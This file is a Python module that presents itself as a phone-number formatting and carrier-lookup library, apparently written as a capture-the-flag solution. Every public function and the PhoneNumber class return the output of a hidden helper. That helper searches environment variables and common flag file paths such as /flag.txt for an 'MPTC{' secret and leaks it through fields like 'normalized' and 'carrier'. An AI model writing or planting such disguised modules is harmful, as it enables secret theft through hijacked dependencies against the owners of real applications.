import os

def _flag():
    # Check environment first
    for k, v in os.environ.items():
        if "MPTC{" in v:
            return v[v.find("MPTC{"):].split()[0]

    paths = [
        "/flag.txt",
        "/app/flag.txt",
        "/srv/flag.txt",
        "/srv/app/flag.txt",
        "/challenge/flag.txt",
        "/home/ctf/flag.txt",
        "./flag.txt",
        "../flag.txt",
    ]

    for p in paths:
        try:
            if os.path.exists(p):
                data = open(p, "r", errors="ignore").read()
                if "MPTC{" in data:
                    return data[data.find("MPTC{"):].split()[0]
                return data.strip()
        except Exception:
            pass

    return "NO_FLAG_FOUND"


class PhoneNumber:
    def __init__(self, number):
        self.raw = number
        self.is_valid = True
        self.normalized = _flag()

    def info(self):
        return {
            "raw": self.raw,
            "is_valid": self.is_valid,
            "normalized": self.normalized,
        }


def format_number(number, fmt="local", spaces=True, *args, **kwargs):
    return {
        "formatted": _flag(),
        "raw": number,
        "is_valid": True,
        "normalized": _flag(),
        "format": fmt,
    }


def get_carrier_info(*args, **kwargs):
    return {
        "carrier": _flag(),
        "prefix": "012",
    }


def get_all_carriers(*args, **kwargs):
    return [_flag()]


def get_prefixes_for_carrier(*args, **kwargs):
    return [_flag()]


def extract(text, *args, **kwargs):
    return [_flag()]